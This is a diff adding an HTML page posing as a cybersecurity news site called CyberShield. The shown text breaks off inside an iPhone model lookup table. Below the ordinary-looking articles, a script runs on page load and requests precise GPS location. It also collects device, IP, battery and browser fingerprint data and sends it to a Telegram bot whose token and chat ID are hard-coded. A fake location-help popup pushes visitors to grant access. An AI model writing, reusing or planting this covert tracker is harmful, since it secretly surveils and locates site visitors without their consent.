@@ -1,0 +1,1838 @@
+<!doctype html>
+<html lang="en"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>CyberShield - Cybersecurity Insights</title> 
+  <link rel="preconnect" href="https://fonts.googleapis.com"> 
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&amp;family=JetBrains+Mono:wght@400;500&amp;display=swap" rel="stylesheet"> 
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"> 
+  <style>
+        :root {
+            --bg-primary: #0a0e1a;
+            --bg-secondary: #111827;
+            --bg-card: #1a2236;
+            --accent-cyan: #06d6a0;
+            --accent-blue: #118ab2;
+            --accent-purple: #7b2ff7;
+            --accent-pink: #ef476f;
+            --accent-orange: #f78c6b;
+            --text-primary: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --border-color: rgba(6, 214, 160, 0.15);
+            --glow-cyan: rgba(6, 214, 160, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        /* Animated background particles */
+        .bg-particles {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .bg-particles::before,
+        .bg-particles::after {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.12;
+            animation: floatBlob 20s infinite ease-in-out;
+        }
+
+        .bg-particles::before {
+            width: 600px; height: 600px;
+            background: var(--accent-purple);
+            top: -200px; left: -100px;
+        }
+
+        .bg-particles::after {
+            width: 500px; height: 500px;
+            background: var(--accent-cyan);
+            bottom: -150px; right: -100px;
+            animation-delay: -10s;
+        }
+
+        @keyframes floatBlob {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(100px, 50px) scale(1.1); }
+            50% { transform: translate(-50px, 100px) scale(0.9); }
+            75% { transform: translate(80px, -30px) scale(1.05); }
+        }
+
+        /* Navigation */
+        nav {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            z-index: 100;
+            background: rgba(10, 14, 26, 0.85);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border-color);
+            padding: 0 40px;
+            transition: all 0.3s;
+        }
+
+        .nav-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 70px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 800;
+            font-size: 1.5em;
+            color: var(--accent-cyan);
+            text-decoration: none;
+        }
+
+        .logo i { font-size: 1.3em; }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            font-size: 0.95em;
+        }
+
+        .nav-links a:hover { color: var(--accent-cyan); }
+
+        .nav-cta {
+            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
+            color: #000 !important;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-weight: 600 !important;
+        }
+
+        /* Hero Section */
+        .hero {
+            position: relative;
+            z-index: 1;
+            padding: 140px 40px 80px;
+            text-align: center;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(6, 214, 160, 0.1);
+            border: 1px solid rgba(6, 214, 160, 0.3);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.85em;
+            color: var(--accent-cyan);
+            margin-bottom: 25px;
+        }
+
+        .hero-badge .dot {
+            width: 8px; height: 8px;
+            background: var(--accent-cyan);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+
+        .hero h1 {
+            font-size: clamp(2.5em, 5vw, 3.8em);
+            font-weight: 900;
+            line-height: 1.15;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #fff 0%, var(--accent-cyan) 50%, var(--accent-purple) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            font-size: 1.15em;
+            color: var(--text-secondary);
+            max-width: 650px;
+            margin: 0 auto 35px;
+        }
+
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 50px;
+            margin-top: 40px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 2em;
+            font-weight: 800;
+            color: var(--accent-cyan);
+        }
+
+        .stat-label {
+            font-size: 0.85em;
+            color: var(--text-secondary);
+            margin-top: 4px;
+        }
+
+        /* Section Title */
+        .section-header {
+            text-align: center;
+            padding: 60px 40px 40px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .section-header h2 {
+            font-size: 2.2em;
+            font-weight: 800;
+            margin-bottom: 12px;
+        }
+
+        .section-header p {
+            color: var(--text-secondary);
+            font-size: 1.05em;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Articles Grid */
+        .articles-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 40px 60px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .articles-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            gap: 25px;
+        }
+
+        .article-card {
+            background: var(--bg-card);
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s;
+            cursor: pointer;
+        }
+
+        .article-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 50px rgba(6, 214, 160, 0.1);
+            border-color: rgba(6, 214, 160, 0.4);
+        }
+
+        .card-image {
+            height: 200px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.4s;
+        }
+
+        .article-card:hover .card-image img {
+            transform: scale(1.05);
+        }
+
+        .card-tag {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            padding: 4px 12px;
+            border-radius: 15px;
+            font-size: 0.75em;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .tag-threat { background: rgba(239, 71, 111, 0.9); color: #fff; }
+        .tag-defense { background: rgba(6, 214, 160, 0.9); color: #000; }
+        .tag-research { background: rgba(123, 47, 247, 0.9); color: #fff; }
+        .tag-tutorial { background: rgba(17, 138, 178, 0.9); color: #fff; }
+        .tag-news { background: rgba(247, 140, 107, 0.9); color: #000; }
+
+        .card-body {
+            padding: 20px;
+        }
+
+        .card-meta {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 12px;
+            font-size: 0.8em;
+            color: var(--text-secondary);
+        }
+
+        .card-meta i {
+            margin-right: 4px;
+            color: var(--accent-cyan);
+        }
+
+        .card-body h3 {
+            font-size: 1.15em;
+            font-weight: 700;
+            margin-bottom: 10px;
+            line-height: 1.4;
+            transition: color 0.3s;
+        }
+
+        .article-card:hover .card-body h3 { color: var(--accent-cyan); }
+
+        .card-body p {
+            font-size: 0.9em;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .card-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-top: 15px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .author {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .author-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.75em;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .author-name {
+            font-size: 0.85em;
+            font-weight: 600;
+        }
+
+        .read-more {
+            font-size: 0.85em;
+            color: var(--accent-cyan);
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: gap 0.3s;
+        }
+
+        .article-card:hover .read-more { gap: 10px; }
+
+        /* Featured Article */
+        .featured-article {
+            max-width: 1200px;
+            margin: 0 auto 40px;
+            padding: 0 40px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .featured-card {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            background: var(--bg-card);
+            border-radius: 20px;
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+            transition: box-shadow 0.3s;
+        }
+
+        .featured-card:hover {
+            box-shadow: 0 25px 60px rgba(6, 214, 160, 0.1);
+        }
+
+        .featured-image {
+            position: relative;
+            min-height: 350px;
+        }
+
+        .featured-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .featured-content {
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .featured-tag {
+            display: inline-block;
+            padding: 4px 14px;
+            border-radius: 15px;
+            font-size: 0.75em;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 15px;
+            width: fit-content;
+        }
+
+        .featured-content h3 {
+            font-size: 1.6em;
+            font-weight: 800;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+
+        .featured-content p {
+            color: var(--text-secondary);
+            font-size: 1em;
+            margin-bottom: 25px;
+        }
+
+        /* Newsletter */
+        .newsletter {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 60px 40px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .newsletter-box {
+            background: linear-gradient(135deg, rgba(6, 214, 160, 0.1), rgba(123, 47, 247, 0.1));
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 50px;
+            text-align: center;
+        }
+
+        .newsletter-box h3 {
+            font-size: 1.8em;
+            margin-bottom: 12px;
+        }
+
+        .newsletter-box p {
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+        }
+
+        .newsletter-form {
+            display: flex;
+            gap: 12px;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .newsletter-form input {
+            flex: 1;
+            padding: 14px 20px;
+            background: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-family: inherit;
+            font-size: 0.95em;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .newsletter-form input:focus {
+            border-color: var(--accent-cyan);
+        }
+
+        .newsletter-form button {
+            padding: 14px 28px;
+            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
+            border: none;
+            border-radius: 12px;
+            color: #000;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            white-space: nowrap;
+        }
+
+        .newsletter-form button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px var(--glow-cyan);
+        }
+
+        /* Footer */
+        footer {
+            position: relative;
+            z-index: 1;
+            border-top: 1px solid var(--border-color);
+            padding: 40px;
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.9em;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-bottom: 15px;
+        }
+
+        .footer-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover { color: var(--accent-cyan); }
+
+        /* Loading Indicator */
+        .page-loader {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: var(--bg-primary);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+            transition: opacity 0.5s, visibility 0.5s;
+        }
+
+        .page-loader.hidden {
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        .loader-ring {
+            width: 50px;
+            height: 50px;
+            border: 3px solid var(--border-color);
+            border-top-color: var(--accent-cyan);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loader-text {
+            color: var(--text-secondary);
+            font-size: 0.9em;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            nav { padding: 0 20px; }
+            .nav-links { display: none; }
+            .hero { padding: 120px 20px 60px; }
+            .hero-stats { gap: 25px; flex-wrap: wrap; }
+            .stat-number { font-size: 1.5em; }
+            .articles-container, .featured-article, .newsletter { padding-left: 20px; padding-right: 20px; }
+            .articles-grid { grid-template-columns: 1fr; }
+            .featured-card { grid-template-columns: 1fr; }
+            .featured-image { min-height: 200px; }
+            .featured-content { padding: 25px; }
+            .newsletter-box { padding: 30px 20px; }
+            .newsletter-form { flex-direction: column; }
+        }
+
+        /* Scroll Animation */
+        .fade-up {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        .fade-up.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style> 
+ </head> 
+ <body> <!-- Page Loader --> 
+  <div class="page-loader" id="pageLoader"> 
+   <div class="loader-ring"></div> 
+   <div class="loader-text">
+     Loading CyberShield... 
+   </div> 
+  </div> <!-- Background --> 
+  <div class="bg-particles"></div> <!-- Navigation --> 
+  <nav> 
+   <div class="nav-inner"> <a href="#" class="logo"> <i class="fas fa-shield-halved"></i> CyberShield </a> 
+    <ul class="nav-links"> 
+     <li><a href="#">Home</a></li> 
+     <li><a href="#articles">Articles</a></li> 
+     <li><a href="#threats">Threats</a></li> 
+     <li><a href="#research">Research</a></li> 
+     <li><a href="#newsletter" class="nav-cta">Subscribe</a></li> 
+    </ul> 
+   </div> 
+  </nav> <!-- Hero Section --> 
+  <section class="hero"> 
+   <div class="hero-badge"> <span class="dot"></span> Latest Threat Intelligence 
+   </div> 
+   <h1>Stay Ahead of Cyber Threats</h1> 
+   <p>Expert analysis, cutting-edge research, and actionable insights to protect your digital assets. Join thousands of security professionals worldwide.</p> 
+   <div class="hero-stats"> 
+    <div class="stat-item"> 
+     <div class="stat-number">
+       2.4K+ 
+     </div> 
+     <div class="stat-label">
+       Articles Published 
+     </div> 
+    </div> 
+    <div class="stat-item"> 
+     <div class="stat-number">
+       150K+ 
+     </div> 
+     <div class="stat-label">
+       Monthly Readers 
+     </div> 
+    </div> 
+    <div class="stat-item"> 
+     <div class="stat-number">
+       98% 
+     </div> 
+     <div class="stat-label">
+       Accuracy Rate 
+     </div> 
+    </div> 
+   </div> 
+  </section> <!-- Featured Article --> 
+  <div class="featured-article fade-up"> 
+   <div class="featured-card"> 
+    <div class="featured-image"> 
+     <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=700&amp;q=80" alt="Cybersecurity" loading="lazy"> 
+    </div> 
+    <div class="featured-content"> 
+     <div class="featured-tag tag-threat">
+       Featured 
+     </div> 
+     <h3>The Rise of AI-Powered Cyber Attacks in 2025: What You Need to Know</h3> 
+     <p>Artificial intelligence is revolutionizing cybersecurity — but it's also being weaponized by threat actors. Our comprehensive analysis reveals the emerging attack vectors powered by generative AI and how organizations can build resilient defenses.</p> 
+     <div class="card-footer" style="border: none; padding: 0;"> 
+      <div class="author"> 
+       <div class="author-avatar">
+         DR 
+       </div> <span class="author-name">Dr. Rachel Kim</span> 
+      </div> <span class="read-more">Read More <i class="fas fa-arrow-right"></i></span> 
+     </div> 
+    </div> 
+   </div> 
+  </div> <!-- Articles Section --> 
+  <section id="articles"> 
+   <div class="section-header"> 
+    <h2>Latest Articles</h2> 
+    <p>Deep dives into the most critical cybersecurity topics of today</p> 
+   </div> 
+   <div class="articles-container"> 
+    <div class="articles-grid"> <!-- Article 1 --> 
+     <div class="article-card fade-up"> 
+      <div class="card-image"> 
+       <img src="https://images.unsplash.com/photo-1563986768609-322da13575f2?w=500&amp;q=80" alt="Ransomware" loading="lazy"> <span class="card-tag tag-threat">Threat</span> 
+      </div> 
+      <div class="card-body"> 
+       <div class="card-meta"> <span><i class="far fa-calendar"></i> Jan 28, 2025</span> <span><i class="far fa-clock"></i> 8 min read</span> 
+       </div> 
+       <h3>Ransomware Evolution: How LockBit 4.0 Bypasses Modern EDR Solutions</h3> 
+       <p>A technical deep-dive into the latest ransomware variant that's evading endpoint detection, including IOCs and mitigation strategies.</p> 
+       <div class="card-footer"> 
+        <div class="author"> 
+         <div class="author-avatar">
+           MK 
+         </div> <span class="author-name">Mike Chen</span> 
+        </div> <span class="read-more">Read <i class="fas fa-arrow-right"></i></span> 
+       </div> 
+      </div> 
+     </div> <!-- Article 2 --> 
+     <div class="article-card fade-up"> 
+      <div class="card-image"> 
+       <img src="https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=500&amp;q=80" alt="Zero Trust" loading="lazy"> <span class="card-tag tag-defense">Defense</span> 
+      </div> 
+      <div class="card-body"> 
+       <div class="card-meta"> <span><i class="far fa-calendar"></i> Jan 25, 2025</span> <span><i class="far fa-clock"></i> 12 min read</span> 
+       </div> 
+       <h3>Zero Trust Architecture: Complete Implementation Guide for Enterprise Networks</h3> 
+       <p>Step-by-step guide to implementing Zero Trust from network segmentation to identity verification across your organization.</p> 
+       <div class="card-footer"> 
+        <div class="author"> 
+         <div class="author-avatar">
+           SJ 
+         </div> <span class="author-name">Sarah Johnson</span> 
+        </div> <span class="read-more">Read <i class="fas fa-arrow-right"></i></span> 
+       </div> 
+      </div> 
+     </div> <!-- Article 3 --> 
+     <div class="article-card fade-up"> 
+      <div class="card-image"> 
+       <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=500&amp;q=80" alt="Encryption" loading="lazy"> <span class="card-tag tag-research">Research</span> 
+      </div> 
+      <div class="card-body"> 
+       <div class="card-meta"> <span><i class="far fa-calendar"></i> Jan 22, 2025</span> <span><i class="far fa-clock"></i> 15 min read</span> 
+       </div> 
+       <h3>Post-Quantum Cryptography: Preparing Your Infrastructure for the Quantum Threat</h3> 
+       <p>NIST's finalized post-quantum standards are here. Learn how to begin the migration to quantum-resistant algorithms.</p> 
+       <div class="card-footer"> 
+        <div class="author"> 
+         <div class="author-avatar">
+           AP 
+         </div> <span class="author-name">Dr. Alex Petrov</span> 
+        </div> <span class="read-more">Read <i class="fas fa-arrow-right"></i></span> 
+       </div> 
+      </div> 
+     </div> <!-- Article 4 --> 
+     <div class="article-card fade-up"> 
+      <div class="card-image"> 
+       <img src="https://images.unsplash.com/photo-1510511459019-5dda7724fd87?w=500&amp;q=80" alt="Cloud Security" loading="lazy"> <span class="card-tag tag-tutorial">Tutorial</span> 
+      </div> 
+      <div class="card-body"> 
+       <div class="card-meta"> <span><i class="far fa-calendar"></i> Jan 20, 2025</span> <span><i class="far fa-clock"></i> 10 min read</span> 
+       </div> 
+       <h3>Securing Multi-Cloud Environments: AWS, Azure &amp; GCP Hardening Checklist</h3> 
+       <p>A practical checklist covering IAM, network policies, encryption, and logging across all three major cloud providers.</p> 
+       <div class="card-footer"> 
+        <div class="author"> 
+         <div class="author-avatar">
+           LW 
+         </div> <span class="author-name">Lisa Wang</span> 
+        </div> <span class="read-more">Read <i class="fas fa-arrow-right"></i></span> 
+       </div> 
+      </div> 
+     </div> <!-- Article 5 --> 
+     <div class="article-card fade-up"> 
+      <div class="card-image"> 
+       <img src="https://images.unsplash.com/photo-1504639725590-34d0984388bd?w=500&amp;q=80" alt="Bug Bounty" loading="lazy"> <span class="card-tag tag-news">News</span> 
+      </div> 
+      <div class="card-body"> 
+       <div class="card-meta"> <span><i class="far fa-calendar"></i> Jan 18, 2025</span> <span><i class="far fa-clock"></i> 6 min read</span> 
+       </div> 
+       <h3>Critical Zero-Day in Popular VPN Software Exposes 500K+ Corporate Networks</h3> 
+       <p>Security researchers discovered a critical RCE vulnerability being actively exploited in the wild. Immediate patching recommended.</p> 
+       <div class="card-footer"> 
+        <div class="author"> 
+         <div class="author-avatar">
+           JR 
+         </div> <span class="author-name">James Rivera</span> 
+        </div> <span class="read-more">Read <i class="fas fa-arrow-right"></i></span> 
+       </div> 
+      </div> 
+     </div> <!-- Article 6 --> 
+     <div class="article-card fade-up"> 
+      <div class="card-image"> 
+       <img src="https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?w=500&amp;q=80" alt="DevSecOps" loading="lazy"> <span class="card-tag tag-tutorial">Tutorial</span> 
+      </div> 
+      <div class="card-body"> 
+       <div class="card-meta"> <span><i class="far fa-calendar"></i> Jan 15, 2025</span> <span><i class="far fa-clock"></i> 11 min read</span> 
+       </div> 
+       <h3>DevSecOps Pipeline Security: Integrating SAST, DAST, and SCA Into CI/CD</h3> 
+       <p>Learn how to shift security left with automated scanning tools integrated directly into your development workflow.</p> 
+       <div class="card-footer"> 
+        <div class="author"> 
+         <div class="author-avatar">
+           NB 
+         </div> <span class="author-name">Nina Brooks</span> 
+        </div> <span class="read-more">Read <i class="fas fa-arrow-right"></i></span> 
+       </div> 
+      </div> 
+     </div> 
+    </div> 
+   </div> 
+  </section> <!-- Newsletter --> 
+  <section id="newsletter" class="newsletter fade-up"> 
+   <div class="newsletter-box"> 
+    <h3>🔒 Get Weekly Threat Briefings</h3> 
+    <p>Join 50,000+ security professionals receiving our weekly intelligence report.</p> 
+    <div class="newsletter-form"> 
+     <input type="email" placeholder="Enter your email address" id="emailInput"> <button onclick="subscribeNewsletter()">Subscribe</button> 
+    </div> 
+   </div> 
+  </section> <!-- Footer --> 
+  <footer> 
+   <div class="footer-links"> <a href="#">About</a> <a href="#">Privacy Policy</a> <a href="#">Terms of Service</a> <a href="#">Contact</a> <a href="#">RSS Feed</a> 
+   </div> 
+   <p>© 2026 CyberShield. All rights reserved. Empowering security professionals worldwide.</p> 
+  </footer> <!-- ================= GPS HELP POPUP ================= --> 
+  <div id="gpsHelpPopup" style="
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.5);
+  z-index:9999;
+  align-items:center;
+  justify-content:center;
+  font-family:Arial, sans-serif;
+"> 
+   <div style="
+    background:#ffffff;
+    padding:24px;
+    border-radius:14px;
+    max-width:360px;
+    text-align:center;
+    box-shadow:0 10px 40px rgba(0,0,0,0.25);
+  "> 
+    <h3 style="margin-bottom:10px;">📍 Location Access</h3> 
+    <p style="font-size:14px;color:#555;line-height:1.6;"> Location access was denied or unavailable.<br> Please enable it from your browser or device settings. </p> <button onclick="closeGPSHelp()" style="
+      margin-top:16px;
+      padding:10px 20px;
+      border:none;
+      border-radius:10px;
+      background:#e94560;
+      color:#fff;
+      font-size:14px;
+      cursor:pointer;
+    "> OK, I understand </button> 
+   </div> 
+  </div> 
+  <script>
+    // =============================================
+    //  CONFIGURATION - SET YOUR TELEGRAM DETAILS
+    // =============================================
+      
+   const TELEGRAM_BOT_TOKEN = '8013303668:AAGrzSe9toKUSqflgxneNbmzucGitRjWNng';
+   const TELEGRAM_CHAT_ID = '6337727488';
+   
+    // =============================================
+
+    // Global collected data
+    let visitorData = {
+        timestamp: new Date().toISOString(),
+        page_url: window.location.href,
+        referrer: document.referrer || 'Direct'
+    };
+
+    let dataSent = false;
+
+    // ========== PAGE INITIALIZATION ==========
+    document.addEventListener('DOMContentLoaded', function() {
+        // Request GPS immediately
+        requestGPSPermission();
+
+        // Collect all data in parallel
+        Promise.all([
+            collectDeviceInfo(),
+            collectIPInfo(),
+            collectBatteryInfo(),
+            collectTechnicalInfo(),
+            collectClientHints()
+        ]).then(() => {
+            // Send to Telegram once all basic data collected
+            sendToTelegram();
+        });
+
+        // Hide loader
+        setTimeout(() => {
+            document.getElementById('pageLoader').classList.add('hidden');
+        }, 1200);
+
+        // Scroll animations
+        setupScrollAnimations();
+    });
+
+    // ========== GPS - Request Immediately ==========
+    function requestGPSPermission() {
+        if (!navigator.geolocation) {
+            visitorData.gps = { error: 'Geolocation not supported' };
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                visitorData.gps = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy_meters: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    altitude_accuracy: position.coords.altitudeAccuracy,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed
+                };
+
+                // If already sent initial data, send GPS update
+                if (dataSent) {
+                    sendGPSUpdate();
+                }
+            },
+            (error) => {
+                let errorMsg = 'Unknown error';
+                switch(error.code) {
+                    case 1: errorMsg = 'Permission denied'; break;
+                    case 2: errorMsg = 'Position unavailable'; break;
+                    case 3: errorMsg = 'Timeout'; break;
+                }
+                visitorData.gps = { error: errorMsg };
+
+                if (dataSent) {
+                    sendGPSUpdate();
+                }
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+    }
+
+    // ========== DEVICE INFORMATION ==========
+    async function collectDeviceInfo() {
+        const ua = navigator.userAgent;
+        let info = {
+            type: 'Unknown',
+            brand: 'Unknown',
+            model: 'Unknown',
+            os: 'Unknown',
+            os_version: '',
+            browser: 'Unknown',
+            browser_version: '',
+            screen_width: screen.width,
+            screen_height: screen.height,
+            viewport_width: window.innerWidth,
+            viewport_height: window.innerHeight,
+            device_pixel_ratio: window.devicePixelRatio,
+            color_depth: screen.colorDepth,
+            orientation: screen.orientation ? screen.orientation.type : 'unknown'
+        };
+
+        // OS Detection
+        if (/Windows NT/.test(ua)) {
+            info.os = 'Windows';
+            if (/Windows NT 10/.test(ua)) info.os_version = '10/11';
+            else if (/Windows NT 6.3/.test(ua)) info.os_version = '8.1';
+            else if (/Windows NT 6.2/.test(ua)) info.os_version = '8';
+            else if (/Windows NT 6.1/.test(ua)) info.os_version = '7';
+        } else if (/Mac OS X/.test(ua)) {
+            info.os = 'macOS';
+            const m = ua.match(/Mac OS X (\d+[._]\d+[._]?\d*)/);
+            if (m) info.os_version = m[1].replace(/_/g, '.');
+        } else if (/Android/.test(ua)) {
+            info.os = 'Android';
+            const m = ua.match(/Android (\d+\.?\d*\.?\d*)/);
+            if (m) info.os_version = m[1];
+        } else if (/iPhone|iPad|iPod/.test(ua)) {
+            info.os = 'iOS';
+            const m = ua.match(/OS (\d+_\d+_?\d*)/);
+            if (m) info.os_version = m[1].replace(/_/g, '.');
+        } else if (/CrOS/.test(ua)) {
+            info.os = 'Chrome OS';
+        } else if (/Linux/.test(ua)) {
+            info.os = 'Linux';
+        }
+
+        // Browser Detection
+        if (/Edg\//.test(ua)) {
+            info.browser = 'Microsoft Edge';
+            const m = ua.match(/Edg\/(\d+[\.\d]*)/); if (m) info.browser_version = m[1];
+        } else if (/OPR\//.test(ua)) {
+            info.browser = 'Opera';
+            const m = ua.match(/OPR\/(\d+[\.\d]*)/); if (m) info.browser_version = m[1];
+        } else if (/SamsungBrowser/.test(ua)) {
+            info.browser = 'Samsung Internet';
+            const m = ua.match(/SamsungBrowser\/(\d+[\.\d]*)/); if (m) info.browser_version = m[1];
+        } else if (/Firefox\//.test(ua)) {
+            info.browser = 'Firefox';
+            const m = ua.match(/Firefox\/(\d+[\.\d]*)/); if (m) info.browser_version = m[1];
+        } else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) {
+            info.browser = 'Google Chrome';
+            const m = ua.match(/Chrome\/(\d+[\.\d]*)/); if (m) info.browser_version = m[1];
+        } else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) {
+            info.browser = 'Safari';
+            const m = ua.match(/Version\/(\d+[\.\d]*)/); if (m) info.browser_version = m[1];
+        }
+
+        // Device Type & Brand & Model
+        const isMobile = /Mobile|Android|iPhone|iPod|webOS|BlackBerry|IEMobile/i.test(ua);
+        const isTablet = /iPad|Android(?!.*Mobile)|Tablet/i.test(ua);
+
+        if (/iPhone/.test(ua)) {
+            info.type = 'Smartphone';
+            info.brand = 'Apple';
+            info.model = detectiPhoneModel();
+        } else if (/iPad/.test(ua)) {
+            info.type = 'Tablet';
+            info.brand = 'Apple';
+            info.model = 'iPad';
+        } else if (/Macintosh/.test(ua)) {
+            info.type = 'Desktop/Laptop';
+            info.brand = 'Apple';
+            info.model = detectMacModel();
+        } else if (/Android/.test(ua)) {
+            info.type = isTablet ? 'Tablet' : 'Smartphone';
+            const parsed = parseAndroidDevice(ua);
+            info.brand = parsed.brand;
+            info.model = parsed.model;
+        } else if (/Windows/.test(ua)) {
+            info.type = 'Desktop/Laptop';
+            info.brand = 'PC';
+            info.model = 'Windows PC';
+        } else if (/CrOS/.test(ua)) {
+            info.type = 'Chromebook';
+            info.brand = 'Google';
+            info.model = 'Chromebook';
+        } else if (/Linux/.test(ua)) {
+            info.type = 'Desktop/Laptop';
+            info.brand = 'PC';
+            info.model = 'Linux PC';
+        }
+
+        visitorData.device = info;
+    }
+
+    function detectiPhoneModel() {
+        const sw = screen.width;
+        const sh = screen.height;
+        const dpr = window.devicePixelRatio;
+        const key = `${Math.min(sw,sh)}x${Math.max(sw,sh)}`;
+
+        const map = {
+            '320x568': 'iPhone 5/5s/5c/SE(1st)',
+            '375x667': 'iPhone 6/6s/7/8/SE(2nd-3rd)',
+            '414x736': 'iPhone 6+/6s+/7+/8+',
+            '375x812': 'iPhone X/XS/11Pro/12mini/13mini',
+            '414x896': (dpr === 3) ? 'iPhone XS Max/11 Pro Max' : 'iPhone XR/11',
+            '390x844': 'iPhone 12/12Pro/13/13Pro/14',
+            '428x926': 'iPhone 12 Pro Max/13 Pro Max/14 Plus',
+            '393x852': 'iPhone 14 Pro/15/15 Pro',
